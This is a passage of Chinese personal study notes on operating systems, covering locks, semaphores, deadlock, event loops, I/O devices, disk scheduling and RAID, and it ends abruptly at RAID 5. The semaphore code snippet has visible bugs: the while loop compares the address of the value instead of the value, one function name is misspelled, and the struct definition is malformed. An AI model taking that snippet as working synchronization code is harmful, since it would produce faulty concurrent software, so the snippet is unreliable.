方案4：链接加载和条件存储指令这个方案用到了两条指令，一条用来加载指针指向的值，另外一条会判断该指针地址指向的值是否发生了更新，若没有发生，则将其设置为新值； 通过这两条指令的配合，可以用来实现锁机制；思路是当执行 lock 函数时，先加载标记变量的值，若为1，则自旋等待，因为表示此时有其他线程占用着锁；若为 0，则使用条件存储指令进行抢占；条件存储指令是原子性的，它会判断标记变量的值是否发生过更新，如果没有，意味着还没有其他线程抢占过，则更新它，并获得锁；如发生过更新，表示有线程提前抢占成功，重新开始循环； 方案5：获取并增加指令这个指令很有意思，它引入了两个标记变量，一个用来表示排队号，一个用来表示当前叫号；跟银行的叫号机工作原理差不多；初始状态下，排号的号码从零开始；第一个线程进来后，取到 n 号，然后排号增加 1，即下一排队号变成了 n + 1 号；取完号后，去窗口看一下当前的叫号，如果刚好是 n 号，则获取锁（开始给它办理业务）；如果不是 n 号，则等候；当线程释放锁时，窗口的服务人员会将叫号增加 1，这样持有该排队号的线程接下来就可以办理业务了； 这个指令有一个特别大的好处，即每个线程都有机会轮上，而且还是先来后到；前后三种方案则无法保证线程什么时候会被安排，靠运气； 避免自旋显然当一个线程无法获取锁时，一直处于自旋等待是完全没有必要的，纯粹是浪费分配给它的 CPU 时钟周期；如果线程很多的话，就会极大的降低性能，因此有必要当线程进入自旋时，就要求它放弃当前的时间片，切换到其他线程； 方法一是在操作系统层面增加一个能够让出当前调度的系统调用，这样当线程发现自己无法获取锁时，就调用该函数，结束当前的 CPU 时间片；这种方法的性能比自旋好了不少，不过如果线程很多的话，仍然可能产生很高的线程切换成本； 方法二是引入休眠功能，并增加一个队列；当线程无法自己获取锁时，就将自己放到队列中等待，然后进入休眠状态，这样它就不再需要频繁的被切换；当其他线程释放锁时，它就去队列里面找一个线程唤醒它； 结合队列，当一个线程取号后，就查看一下当前叫号，如果不是自己的号，就进入休眠队列，等待被唤醒；当某个线程释放锁时，叫号增加1，然后唤醒队列中对应编号的线程；该线程被唤醒后，检查一下当前叫号，如果是自己，就去尝试获取锁；如果不是自己，重新进入休眠；如果获取不到锁，则意味着有人抢占了，也重新进入休眠； 23.使用锁的并发数据结构锁的目的是应对并发的场景，但并非所有的并发，都需要使用锁；只有并发场景需要访问修改共享变量时，才需要用锁；这个时候，在设计数据结构的访问修改函数时，需要考虑锁的使用时机和位置，这样才能确保数据的线程安全；但确保线程安全不难，如果要同时兼顾性能，就开始形成一定的挑战了； 并发计数器计数器是很常见和频繁使用的一种数据结构，某些场景需要在多线程之间共享某个计数器，此时该数据结构将面临线程安全问题；此时会遇到的一个问题是可扩展性，即保证线程安全的情况下，访问性能没有下降，即实现可扩展的计数； 可扩展的计数 单核多线程可以实现并发，但并没有提高性能，只有多核多线程，才通过利用了多核的优势，提高了性能；所谓的可扩展性是指，在引入多核的情况下，原本的锁设计，仍然能够保证对数据结构的访问，能够获得跟单核单线程同样的性能； 它的实现有很多种办法，其中一种叫懒惰计数器，它通过牺牲一点准确性，来保证性能问题；其基本思路是使用全局锁和全局变量来记录全局的计数器，但在每个 CPU 里面，又增加一个局部计数器和局部锁；对于单个 CPU 内部的线程，它只负责当前 CPU 的锁并更新局部的计数器，这样一来没有人跟它竞争，因此它的性能同单核单线程是一样的；然后设定一个阈值，当某个 CPU 的局部计数器值越过这个阈值时，该 CPU 就尝试获取全局锁，将自己的局部计数器值同步写入全局的计数器； 整体来说，当 S 足够大时，这种方法的性能跟单核单线程越接近，但是全局计数器会有一定的延迟；即任意时间点下，获取到的全局计数器值，可能并不是最新的，而是对应于过去的某个时间点； 并发链表让链表的操作实现线程安全并不复杂，重点是保证在更新链表的关键时刻（即临界区）加锁即可，并在更新完之后，释放锁，避免将加锁的位置提前到内存分配的时候，因为内存分配有可能发生错误，这样会导致锁没有释放； 虽然链表的线程安全容易做到，但是多核多线程下的高性能却是很有挑战，因为链表是一种线性查找的数据结构，它无法提前将任务分段，交给不同的 CPU 并发处理； 并发队列对于先进先出的队列，需要设置两把锁，一把负责头部，一把负责尾部，它们之间可以实现并发，即在头部删除元素和尾部增加元素并不会发生冲突； 并发散列表在不考虑改变散列表大小的情况下，散列表的实现只需要基于之前的链表结构即可，每个桶对应一个单独的链表；而每个链表的背后已经是支持线程安全的；这种结构的散列表具有很好的扩展性，因为它实质上是链表间独立的锁，并不会相互影响； 24.条件变量使用场景锁只是解决了线程并发访问某个共享变量的问题，但有时候线程之间需要等待某种条件满足后才能继续往下进行，例如当某个线程执行完毕后，另一个线程再开始执行。最简单的解决方案是引入某个条件变量，需等待的线程在它的时间片中，不断的检查这个变量，如果条件满足了，就继续往下执行，如果不满足，就自旋等待。该方案的好处是实现简单，缺点是性能低下，因为自旋需要浪费掉整个时间片； 新的解决办法：除了已有的锁和条件变量后，再引入睡眠和循环检查；线程 A 持有锁后，检查到条件不满足时，就让 A 进入释放锁并进入睡眠；B 线程开始持有锁，做完动作，更新条件变量，发信号唤醒 A，并释放锁；A 被唤醒后，尝试重新取得持有锁后，再次检查条件变量，若满足，开始执行自己余下的动作； wait() 操作会做四个动作：释放锁、睡眠、被唤醒、获取锁；因此，在执行 wait 之前，当前线程获取锁是必须的，不然有可能长眠不醒了； signal() 在执行之前也需要先获取持有锁，避免产生竞态条件； 生产者&#x2F;消费者问题 当有多个生产者线程和多个消费者线程时，如何解决它们之间使用共享缓冲区可能存在冲突的问题？ 为了尽可能提高效率，应该避免单次的生产-消费之间的轮换，而应该支持批量多生产和批量多消费，这样可以减少轮换等候的成本；因此，需要引入数组的数据结构，生产者可以依次给每个数组的每个位置写入值，而无须等待消费者是否已经来把值取走了，除非整个数组都写满了；这么做的原因在于，当某个生产者线程释放锁时，抢占到锁的不一定是消费者线程，也有可能是另一个生产者线程，因此该方案可以让它有事可做，而不是放弃它抢到的时间片； 另外还需要引入两个条件变量，分别代表生产者和消费者；当某个生产者线程完成了它自己的工作后，它就同时唤醒一个消费者线程并释放锁；（但释放后并意味着下一个抢到锁的是消费者，也有可能是一个生产者，反之亦然）； 好奇：生产者是先释放锁，再唤醒消费者；还是先唤醒消费者后，再释放锁？ 答：从安全的角度来说，貌似应该先释放锁，之后再唤醒消费者；因为如果先唤醒消费者，有可能在释放锁之前，消费者抢占到了时间片，然后尝试获取锁，发现获取不到，然后就重新进入睡眠了； 覆盖条件覆盖条件的一个例子是多线程的内存分配；内存分配函数检查当前可用堆内存，如果大于待分配值，则进行分配，如果小于，则进入睡眠；内存释放函数在释放某个之前分配的内存后，唤醒睡眠中的内存分配线程；但由于不知道当前释放的内存，是否能够满足哪些待分配线程，它只能将所有睡眠中的分配线程全部唤醒； 不知道为什么这种方案叫做覆盖条件，它真实的本质是不再只唤醒某个线程，而是唤醒所有线程；虽然这种做法会降低性能，因为有些线程唤醒后发现条件仍未满足，然后只好又睡了； 24.信号量 除了锁和条件变量外，信号量是另外一种解决并发问题的方案，这个方案很有趣，感觉它好像自带队列的性质，而且去除了 while 循环； 信号量的定义信号量（semophore）是一个整数值，并配套两个函数来操作它，它们分别是： sem_wait()：也叫 down 或 P 函数，它做两个动作，一是将信号量减1，二是判断减1后的信号量是否为负数，如果是，则让当前线程进入睡眠； sem_post()：也叫 up 或 V 函数，它也做两个动作，一是将信号量加1，二是判断有无睡眠中的线程，如有，唤醒其中一个； 当信号量为负数时，该负数值刚好表示当前有多个线程处于睡眠状态中； 1234#include &lt;semaphore.h&gt;sem_t s;sem_init(&amp;s, 0, 1); // 初始化信号量，0 表示该信号量被同一进程的多个线程共享；1 表示初始值为 1； 二值信号量（锁） 问：不知此处为何叫二值信号量，事实上当有多个线程时，信号量的值并不只是在 0 和 1 之间变化，而是有可能会出现负数； 答：被唤醒的线程将直接获得锁，不用再次执行 wait 进行判断（因为之前已经执行过了）；并在执行结束后，对信号量做加1的操作； 当将信号量的初始值设定为 1 时，在临界区的前后调用 sem_wait 和 sem_post 函数的效果，跟上一章的 lock 和 unlock 作用很像，此时信号量发挥的作用跟锁是一样的； 此时信号量扮演的作用非常有趣和巧妙，由于每个线程在进入临界区前，都需要调用 sem_wait 函数尝试获取锁，如果获取不到，就会让自己进入睡眠状态；而当线程从临界区出来的时候，如果有线程在等待，它需要唤醒一个线程，那么这个被唤醒的线程，等同直接获取了锁（此时的信号量有可能依然为负数），而无须做进一步的判断（之前的锁方案有使用 while 进行判断）； 问：如何保证所有的线程都有相同的机会被唤醒，而不会出现某些线程被饿死？ 123sem_wait(&amp;m);// critical section heresem_post(&amp;m); 信号量用作条件变量当将信号量的初始值设定为 0 时，它可以作为条件变量，用于 A 线程调用 sem_wait 函数等待条件满足时，再继续往下执行，而 B 线程负责调用 sem_post 函数改变条件； 生产者&#x2F;消费者问题生产者&#x2F;消费者问题据说也叫做有界缓冲区问题；原因在于除了缓冲区的 empty&#x2F;full 判断外，为了避免多个生产者（或消费者）同时进入 get&#x2F;put 函数，需要对多个生产者之间增加互斥，即每次只能有一个生产者进入 put，或者只有一个消费者进入 get； 此处对 get&#x2F;put 的互斥锁，不再放在 empty&#x2F;full 锁的外面，不然由于它的作用域过大，将直接导致死锁情况发生，即某个线程因为 empty 进入睡眠了，但却仍然持有 mutex 锁，导致后续的线程无法获取锁并将其唤醒；避免作用域过大的做法，即为考虑锁的使用界限，因此称为有界缓冲区问题； 读者-写者锁 不同的数据结构，会面临不同的并发状态，例如链表结构，只有写的并发是需要用到锁的，而读的并发则可以不用锁，因此，如果为不同的数据结构设计不同形式的锁，有利于进一步提高性能； 它的思路是设计两个信号量，一个用来控制读，一个用来控制写，并增加一个当前正在读的线程的计数器；第一个读者需要同时获取读锁和写锁，这样可以避免其他线程在它读的时候，进行写的操作；第二个及以后的读者则无须获取写锁；最后一个退出的读者需要负责释放写锁，以便让写者线程可以有机会进行写的操作； 这个方案虽然可以实现读写分离，但是它有两个问题，一个是写者线程有可能被饿死；二是相比普通单锁的方案，由于多增加了一个锁，性能上其实并没有优势； 启示：复杂的方案不一定更好，有时候简单的笨办法反而不错；Hill 定律：大而笨更好； 哲学家就餐问题 这个问题的有趣之外在于，哲学家们是坐成一圈的，所以一个人的左边，是另一个人的右边。因此如果每个哲学家取叉子的顺序一样的话，将有可能造成循环等待的问题，结果便是死锁；为了避免死锁，需要至少让一个哲学家的取叉子顺序跟别人不同，这样就至少会有一个哲学家能够吃上饭了； 如何实现信号量123456789101112131415161718192021222324252627282930// 使用锁+条件变量的方式，来实现信号量机制typedef struct _zemt_t &#123; int value; pthread_cond_t cond; pthread_mutex_t lock;&#125;void Zem_init(Zem_t *s, int value) &#123; s-&gt;value = value; Cond_init(&amp;s-&gt;cond); Mutex_init(&amp;s-&gt;lock);&#125;void Zem_wait(Zem_t *s) &#123; Mutex_lock(&amp;s-&gt;lock); while(&amp;s-&gt;value &lt;= 0) &#123; // 进入睡眠前会释放锁；唤醒后会持有锁 Cont_wait(&amp;s-&gt;cond, &amp;s-&gt;lock); &#125; s-&gt;value -= 1; Mutex_unlock(&amp;s-&gt;lock);&#125;void Zem_post(Zem_t *s) &#123; Mutex_lock(&amp;s-&gt;lock); s-&gt;value += 1; Cond_signal(&amp;s-&gt;cond); Mutex_unlock(&amp;s-&gt;lock);&#125; 使用锁+条件变量也可以实现信号量，因此信号量看上去有点像是锁+条件变量的一种抽象；它既可以用来替代锁，也可以用来替代条件变量，但是，能否替代成功，跟问题场景密切相关，并不是所有的场景都能够替代成功的；因此，使用信号量时要特别的小心，虽然看似简单了，但效果不一定百分百保证，需要进行更加深入的分析和测试，才能够建立信心； 安全起见，使用原始的锁+条件变量方案，或许是更好的做法； 25.常见并发问题 有哪些常见的并发缺陷？如何处理常见的并发缺陷？ 有哪些类型的缺陷一般有非死锁和死锁两类缺陷，前者占多数； 非死锁缺陷违反原子性缺陷代码原本预期按原子性来执行，但实际的效果并没有实现原子性，A 线程的部分操作在执行到一半的过程中，可能会因为调度产生中断，某些值被新线程 B 修改，导致调度回 A 线程时，其执行环境已经发生了破坏，导致出错； 解决办法：给需要原子性的操作加锁； 错误顺序缺陷B 线程在运行过程中可能假定某个值已经由前面的 A 线程完成了初始化，但实际上，由于调度的随机性，有可能这个时候A 线程还未被调度过，初始化并未完成； 解决办法：引入锁+条件变量+状态变量； 绝大部分的非死锁缺陷（约 97%）都是以上两种类型的缺陷； 死锁缺陷有多个锁，且线程的抢锁顺序不同，导致最终陷入相互等待的境地； 产生的原因 复杂系统中，组件之间很可能存在相互依赖，例如虚拟内存需要通过文件系统访问磁盘读取数据到内存，而文件系统又要访问虚拟内存申请一片内存页，存放相应的数据； 封装：开发人员一般倾向于模块化实现的细节，但是模块化有时无法跟锁很好的契合，导致出现死锁； 产生死锁的条件必须同时满足以下四点 互斥：对于共享的某个资源，线程对其访问存在互斥性，即一次只有一个线程可以抢到访问资源的锁； 持有并等待：线程持有一个资源后，还需要等待抢占其他资源； 非抢占：线程已经获得的资源，不会被其线程抢占； 循环等待：线程之间存在回路，某个线程持有的资源，刚好是下一个线程想要抢占的； 预防的方法循环等待针对循环等待，简单的解决办法就是强制线程对锁的抢占需要按照固定的顺序，比如有两个锁 L1 和 L2，总是先抢 L1，再抢 L2；这样就可以避免两个锁被不同的线程分别持有； 全序：锁少的时候用； 偏序：锁很多的时候用； 持有并等待持有并等待的问题根源于等待的资源可能被占用，因此可以通过增加一个全局锁来解决；所有的线程，必须先抢到这个全局锁后，才可以开始抢占剩下的锁，这样就可以避免存在资源在不同线程手上的问题，但这个方案也有一些缺点 一是降低了并发性，因为现在所有的线程都得等待同一个锁了； 二是不便于封装，据说是因为需要准确的知道需要抢些锁，并提前抢到这些锁（暂时还没有想明白为什么，可能是因为锁需要设置成全局的，无法封装到函数内部里面去）； 非抢占解决思路就是增加一个 trylock 的判断，当暂时无法抢到下一个资源时，就先放弃已经占有的资源；这种方式肯定不会造成死锁，但有可能陷入活锁的问题；就是大家总是让来让去，最后啥进展也没有；为了避免活锁问题，需要引入一个随机等待时间，即等候一个随机时间后，再开始新的一轮循环，这样可以一定程度的降低活锁概率； 互斥互斥性是锁的本质，如果不提供互斥性，锁就没有存在的意义了；如果不用锁，则需要通过利用硬件指令的原子性，来实现原子性的操作，例如比较并互换指令（但是感觉它的应用场景貌似有限？）；但是这种方案有可能会带来活锁问题； 通过调度避免死锁如果我们能够提前知道不同线程可能对锁的需求不同，则只需避免将会有完全重叠锁需求的线程调度到不同 CPU 上同时运行即可；不过这种方案有硬伤，一是它极大的降低了性能；二是我们需要提前知道所有的任务，并知道它们各自需要什么样的锁，这样才可以设计出调度的方案； 示例一： 示例二： 检查和恢复最后一个不是办法的办法是允许死锁发生，然后定期做一次检查，如果发生停滞了，就做一次重启；很多数据库采用了这个方案； 26.基于事件的并发基本思路事件处理程序一开始啥也不做，坐等事件的到来；它轮询事件队列，获取待处理的事件，然后依次处理 123456while (1) &#123; events = getEvents(); for (e in events) &#123; processEvent (e); &#125;&#125; select() API 介绍操作系统提供了一个 select 系统调用函数来实现基于事件循环的并发；它的原理也很简单，该系统调用接收一堆文件描述符的集合和待检查的数量上限；之后操作系统在该数量上限内，依次逐一检查每个文件描述符（包括读、写、错误三类），看某个描述符是否已经进入了就绪的状态；最后，将所有已经处于就绪状态的文件描述符组成一个列表返回； 问：为什么要引入一个上限？ 1234567int select ( int nfds, // 待检查文件描述符数量上限 fd_set *restrict readfds, // 读 fd_set *restrict writefds, // 写 fd_set *restrict errorfds, // 异常 struct timeval *restrict timeout // 检查时间，超时后返回；若为 NULL 则在未找到任何就绪的描述符前先阻塞；若为 0 则马上返回); 使用 select()建立一个无限循环，在循环开始时，初始化并准备好一个文件描述符的集合，然后调用 select，将集合送进去检查；如果某个描述符已经进入了就绪状态，select 会对其进行标记；当 select 标记完毕返回完；再依次遍历集合中的每个描述符，看其标记是否改变，若改变，表示该描述符已经就绪，因此可调用相同的函数，对其进行处理； 由于只剩下一个线程在处理事件，因此基于事件的并发处理机制，就暂时不需要锁了，因为不存在线程之间的冲突；不过当 CPU 不止一个时，如果想利用多核 CPU，则有可能会存在冲突； I&#x2F;O 异步如果应用程序发起的操作，仅仅在 CPU 层面就可以完成的话，事件机制是没有任何性能问题的；但是如果某个操作涉及 CPU 之外的操作，例如对 I&#x2F;O 设备的访问，由于这些设备很慢，将导致 CPU 要等待很长时间才能得到结果，这将导致严重的性能下降，因为 CPU 的时间片大量闲置；仅仅有 select 调用，还不足以让基于事件的机制应付各种业务场景，需要引入一些新的操作系统接口来完善它； 早期操作系统对 I&#x2F;O 设备发起的请求是同步的，为了支持基于事件的并发，现代操作系统开始提供异步的 IO 请求接口；应用程序调用该接口，发起 IO 请求，但在请求完成之后，操作系统又会马上将控制权返回给应用程序； 当 IO 请求中的动作完成后，此时有两种机制可以通知应用程序： 应用程序定期轮询的 IO 请求队列，查看是否有某个请求已经就绪；该方案的缺点是成本过高； 请求完成后，发出中断信号给应用程序，应用程序再进行处理；优点：性能好； 状态管理当一个异步的 IO 请求进入就状态后，应用程序需要知道如何处理该请求的结果，因为应用程序可能在之前已经发起过很多个 IO 异步请求，每一个请求的结果可能需要使用不同的方式进行处理；为了能够让请求结果和处理方式一一对应，一种办法是在发起请求的时候，将相应的结果处理方式，也记录在文件描述符的某个属性中，这样当请求结果返回时，就可以在文件描述符中查找到该属性，获得对应的结果处理办法； 仍然存在的问题 无法利用多核CPU：虽然单线程的机制避免了使用锁带来的麻烦，但是单线程无法利用多核的 CPU 来提高性能；如果针对每个 CPU 各开一个线程，则线程之间将不可避免会遇到临界区冲突的问题； 部分系统调用非异步：当某个非异步的系统调用发生错误时，例如发生了页错误，由于应用程序是单线程的，此时将导致整个应用程序被阻塞挂起，无法做出响应； 可能会累积复杂性：基于事件的代码引入了一些复杂性，随着时间的推移，这些代码的复杂度将逐渐累积，可能会给后续增加代码管理成本； 基于事件的并发机制并不是万能药，或许暂时较为可行的解决方案之一，是将应用程序设计成无状态的，这样就可以充分利用多核的CPU，甚至是多个机器节点；而将有状态的数据，交给其他的应用程序如数据库进行管理；数据库来负责原子性的部分； 27.I&#x2F;O 设备 问题：I&#x2F;O 显然是非常重要的，那要如何将 I&#x2F;O 集成到系统中？常见的机制是什么？如何让其变得高效？ 系统架构不同的设备使用不同速度规格的总线相连，取得成本和速度之间的折中平衡； 标准设备计算机是由多种设备组合在一起协同工作的，设备与设备之间需要相互配合协作；因此，每个设备都需要定义一套自己的接口和交互协议，以便别人可以调用它提供的功能；而在设备内部，设备需要负责接口所代表的功能的具体实现；实现的办法同样包括拥有自己的微处理器、通用内存、完成特定功能的芯片等； 标准协议12345678while (STATUS == BUSY) ; // 轮询等待，直到设备空闲write data to DATA register // 设备空闲时，向设备DATA寄存器写入数据write command to COMMAND register // 向设备的 COMMAND 寄存器写入指令，之后设备开始按指令处理数据while (STATUS == BUSY) ; // 轮询等待设备处理完毕get data or status from register // 处理完毕后，从设备的寄存器读取状态和数据 标准协议的交互逻辑还是很简单的，问题在于太过于低效，因为 CPU 要在整个时间片里面不断轮询，浪费了很多无谓的时间； 利用中断减少 CPU 开销减少 CPU 开销的一个办法是引入中断机制，让设备处理完毕后，可以给 CPU 发一个中断信号，之后 CPU 就可以调用提前映射好的中断处理程序，处理设备计算结果； 中断机制并非在所有情况下都是最好的方案，它比较适用于与计算速度比较慢的设备进行协作的场景中；如果设备的计算速度很快，在收到命令后能够很快给出结果，则中断并没有太大意义，反而增加了切换的成本，此时传统的轮询机制的性能反而更好； 但是有时候并不知道设备的处理速度有多快，一个折中的办法是引入混合模式，即 CPU 在发送完指令给设备后，就尝试轮询一小段时间，如果在该时间内设备仍然未处理完毕，CPU 就切换到其他线程； 网络场景也不适合完全使用中断，因为服务器有可能在短时间内收到大量的请求，如果只用中断机制，将使得 CPU 疲于应付大量的中断信号，而无暇处理真正的请求内容；此时适当配合使用轮询反而效果更好，CPU 可以通过轮询的方式接收一批请求的数据包，然后专心处理它们；处理完之后，再轮询网卡，处理下一批请求的数据包； 另外也可以在设备层面对中断机制进行优化，设备不再是一处理好马上发出中断，而是可以稍等一小段时间，先继续处理一些请求，因为它们有可能也很快可以完成；之后再一次性的发起一次中断；通过将多个中断合并成一个中断，也可以降低中断的性能代价； 问题：当 CPU 收到设备发过来的中断信号后，由于此时 CPU 有可能已经切换到其他线程，CPU 如何知道中断信号是属于哪个线程的？ 答：猜测 CPU 并不需要知道，它只要把信号转发给操作系统就好了，由于操作系统负责做好映射表，查询某个设备之前是由哪个线程调用的；此时操作系统负责唤醒该线程； 利用 DMA 更高效的传输数据当 CPU 在跟设备交互的时候，有一个环节是需要向设备写入或读取数据，这个动作本身也是需要时间的，但是它是非常简单的数据读取或拷贝，并不需要什么计算能力，因此让 CPU 来做这个工作有点屈才和得不偿失；为了避免这个问题，通过引入 DMA（direct memory access）机制，给 CPU 减轻工作压力，让它去处理其他更高价值的工作； 当进入读写数据的环节时，CPU 就发送相关的指令给 DMA，包括数据在内存中的位置，数据的大小，数据的目的地等信息；之后 CPU 开始去做其他的工作，而 DMA 就负责接下来的数据传输工作； 操作系统与设备交互的方法 问：操作系统用什么方式跟设备发生交互？例如从设备读取数据，或者向设备写入数据？ 方法一：I&#x2F;O 指令CPU 提供了一些 I&#x2F;O 指令供操作系统调用；当操作系统想要向某个设备写入数据时，就调用该指令，指定设备的某个寄存器（设备存放数据的地方），指定端口号（代表某个特定的目标设备）；CPU 在收到指令后，执行向设备写入数据的操作； 这些 I&#x2F;O 指令都是特权指令，只有操作系统才有权调用，普通程序无权调用； 方法二：内存映射 I&#x2F;O操作系统不直接与设备的寄存器打交道，而是将设备的寄存器映射到虚拟内存地址空间中，用某个虚拟地址代表它；当需要向设备写入数据时，操作系统调用的指令跟平时写入虚拟内存时一样；CPU 在收到该指令后，通过映射表找到实际的设备寄存器地址，然后向设备的寄存器写入数据（内存映射的一个好处是 CPU 不需要单独设计额外的指令集，仅使用原有的指令集就可以了）； 问：映射关系记录在哪里？ 答：莫非 CPU 的 TLB 里面有专门的地方用来记录这个东西？ 纳入操作系统：设备驱动程序操作系统由很多个子系统构成，每个子系统都可能与设备打交道，显然让每个子系统都直接去调用设备的交互接口并不是一个好主意，因为当某个设备发生变动时，导致所有子系统都需要做出调整；更好的办法，是让部分模块专门负责与某个特定设备进行交互，由它负责具体的交互实现细节；而系统中的其他模块，只要直接调用该模块提供的接口就好了；（这其实就是简单又强大的抽象分层技术）； 某个具体实现与特定设备进行交互的模块，即是常说的设备驱动程序； 这种架构也有一点缺点，即如果某个比较新款的设备提供了一些市面上不常见的特殊功能，由于通用块接口的开发或者某个系统软件（如文件系统）的开发还没有跟上，暂未实现调用该特殊功能的接口给应用程序，将导致应用程序实际并无法使用到设备提供的最新功能； 此时貌似需要操作系统尽快推出补丁了？ IDE 磁盘驱动程序示例IDE 硬盘包括以下寄存器： 控制寄存器：1个； 命令寄存器：8个； 状态寄存器：1个； 错误寄存器：1个； 驱动程序与设备的交互过程大概如下： 等待设备就结绪：通过查看设备的状态寄存器获得是否就绪的信息； 写入命令参数：向设备的命令寄存器写入参数：写入的内容包括扇区数、逻辑块地址、磁盘编号（因为同一条 IDE 线支持挂载两个硬盘）； 写入命令：向设备的命令寄存器写入命令，以便配合上一步的参数，让磁盘实现具体的操作； 数据传送：等待，直到设备的状态寄存器的值再次更新为 READY 和 DRQ 时，向设备的数据寄存器写入数据； 中断处理：正常情况下，每个扇区的数据传送结束后，都会触发一次中断，以便调用相应的中断处理程序； 错误处理：每次操作后，都检查一下错误寄存器，就触发错误处理程序； 28.磁盘驱动器 问题：现代磁盘驱动器是如何存储数据的？接口是什么？数据是如何安排和访问的？磁盘调度如何提高性能？ 基本单位磁盘驱动器的最小单位是扇区，每个扇区默认为 512 字节；每一次操作都是什么一个扇区的原子性操作，要么全部写入，要么全部没有写入；整个磁盘被划分为 n 个扇区，相当于一个由 n 个元素组成的数组；地址空间（即地址编号范围）由 0 到 n-1 组成； 虽然有些文件系统支持以 4KB 为单位的读取和写入，但实际上在底层仍然是以 512 字节为单位的；这意味着 4KB 的操作并非原子性的，如果在读写过程中发生断电，有可能导致 4KB 的数据只写了一部分； 基本几何形状由大到小：盘片-&gt;表面-&gt;磁道-&gt;扇区；表面上的磁道很多，几百个磁道加起来也只有一根头发的粗细，因此整个表面拥有成千上万的磁道；由于越外围的磁道，周长越大，因此如何分配跟内围的磁道相同的扇区数的话，显然会造成极大的浪费；因此，一般将表面分成多个区域，相同区域内的磁道，虽然周长不同，但扇区数相同；不同区域的磁盘，扇区数不同，以最大化利用磁盘表面的空间进行数据存储； 缓存机制寻道时间和旋转延迟是磁盘 I&#x2F;O 操作中时间成本最高的两个操作；为了降低每次读写数据的时间成本，磁盘通常会引入缓存机制，即并不是精准读取指定扇区的数据，而是将整个磁道多个扇区的数据一起读取出来，放到缓存中；由于局部性原理，接下来这些数据有很大概率被访问，从而避免了第二次的寻道和旋转时间； I&#x2F;O 时间对于随机访问和顺序访问两种场景来说，磁盘性能差距巨大，可能有 200-300 倍左右的差距；随机访问可能才 0.5M&#x2F;s，而顺序访问可以达到 100M&#x2F;s； 调度策略相对于任务调度，磁盘调度有一个好处是可以大概估算完成操作所需要的时间，假设操作系统收到多个磁盘调度的请求，由于可以大致计算每个调度的用时，因此可以使用一些调度策略来提高调度性能； 最短寻道时间优先操作系统可以根据请求的扇区地址，计算出各个请求与当前位置的远近顺序，优先服务最近的请求，延后服务最远的请求；这样可以避免浪费时间在寻道上面；缺点：有可能导致最远磁道的请求饿死； 电梯扫楼策略这个策略很像到写字楼发传单的场景，推广人员乘坐电梯，将底层到顶层，将每一层楼扫一遍；扫完之后，如果还有没有新进来的待处理请求，再从最顶层到最底层扫一遍，以此类推； 这个方法的好处是可以避免某些请求饿死，但它仍然不是最优的算法，因为它没有考虑旋转延迟的成本； 最短定位时间优先这个策略的优点是将旋转延迟的成本也考虑进来了，以最短的寻道时间+旋转时间之和作为调度的顺序；但是理想很丰满，现实很骨感；因为磁盘的规格型号很多，操作系统并不知道所要寻找的扇区在磁盘表面的位置，因此也无法估算出旋转时间；所以，这个策略并不适合操作系统，但适合在磁盘内部来实现；因为每个磁盘生产商在生产磁盘的时候，各项参数是已知的； 双重调度在早期，磁盘的调度是由操作系统来完成的，但为了取得更好的性能，现在改成了由操作系统和磁盘二者共同完成；操作系统挑选一批自认为不错的请求发给磁盘（例如会合并一些扇区相近的请求），磁盘使用内置的调度程序，以最快的策略处理请求并返回结果； 一般来说，操作系统并不是一收到应用程序的 I&#x2F;O 请求，就马上将它发给磁盘，而是会稍微等一小段时间，让更多的请求进来后，再开始调度； 29.廉价的冗余磁盘 问：数据除了能够更快的访问外，如何解决可靠性问题，避免意外丢失？ RAID 的全称竟然是 Redundant Array of Inexpensive Disk，翻译一下：廉价的冗余磁盘组； RAID 的思想很像单独组建一套由多个磁盘、内存、1个或多个处理器组成的计算机系统，这套系统的专职工作即是完成数据的存储和管理；它有如下的优点： 增加了可靠性，即使有一个磁盘不工作了，也不会导致数据的丢失； 提高了性能，原来的 I&#x2F;O 请求需要排队逐个处理，现在可以分散给多个磁盘并发处理； 接口和 RAID 内部RAID 对外暴露的接口跟普通的磁盘完全一样，这就使得它的部署和使用变得没有成本，不需要改动操作系统或应用程序，即可以像使用普通磁盘那样使用 RAID 磁盘； 但实际上 RAID 内部是相当复杂的，它接近等同一个独立的计算机系统，有自己的内存、处理器和磁盘；当它接收到外部的逻辑请求后，对该请求进行换算，映射成物理请求，然后发给磁盘进行处理； 故障模型RAID 本质上主要还是为了提高可靠性，因此需要对现实世界中可能发生的故障类型进行建模，常见的有如下几种类型的故障： 故障-停止：磁盘出现故障，然后不工作了； 磁盘损坏 扇区错误 如何评估 RAIDRAID 有多种设计实现方案，分别对应满足不同的业务需求，有些侧重可靠性，有些侧重性能，因此一般有三个评估的维度： 性能； 可靠性 容量； RAID 0级：条带化条带化的思想是将扇区按顺序轮流放在每个磁盘上，示例如下： 块的大小以多大的块作为最小的单位，轮流存储在每个磁盘上，是一个设计时需要权衡的问题；块越小，则文件访问的并行性越好；但是同时会增加寻道和旋转成本；因此并不存在最佳方案，完成取决于主要应用在何种业务场景；一般来说，大多数使用 64KB 的块大小； 优点：性能好、容量大； 缺点：可靠性差，因为任一磁盘故障都将导致数据丢失； RAID 1级：镜像镜像的原理是将同一份数据在两个或多个磁盘上各存储一个副本；它的好处是增加了可靠性，即使有一个磁盘发生了故障，也不会导致数据丢失，由于可以并发的读写，因此性能上也没有损失；缺点是损失了容量； 镜像在写入数据的时候，需要同时更新两个或多个磁盘，如果此时其中一个磁盘发生断电，没有写入成功，最后将导致各个磁盘存储的数据不一致；为了解决这个问题，RAID 1 引入了一个小小的非易失性的 RAM，用来预写日志；这样如果万一有某个操作被意外中断没有完成，仍然可以通过日志在后续弥补； 前面说性能没有损失有点错误，实际上性能在不同场景下有些差异： 顺序读：N * S &#x2F; 2 顺序写：N * S &#x2F; 2 随机读：N * R 随机写：N * R &#x2F; 2 此处 N 表示磁盘的数量，S 表示顺序，2 表示副本数量，R 表示随机，单位为 M&#x2F;s RAID 4级：通过奇偶校验节省空间由于 RAID 1级非常浪费空间，RAID 4 级准备在这个维度上进行改进；它的思路是在普通磁盘上使用异或算法得到计算结果，并增加一个磁盘用来存储该异或结果； 这样当某个磁盘出错时，可以跟剩余磁盘的位+校验磁盘位，再次异或，得到丢失的位的值； 这个算法很机智，不过 RAID4 最大只能允许一个磁盘出错，如果有2个或多个以上的磁盘出错，就恢复不了了； 各个场景下的性能分析： 顺序读：(N - 1) * S 顺序写：(N - 1) * S 随机读：(N - 1) * R 随机写：R &#x2F; 2，看起来确实很糟糕，因为只有一个校验磁盘，这意味着对任何普通磁盘的写入，都必须汇总到校验盘的读写上面，而它又需要先做一次读，再做一次写，才能完成一个逻辑写入，因此性能下降为单个磁盘的一半； RAID 5 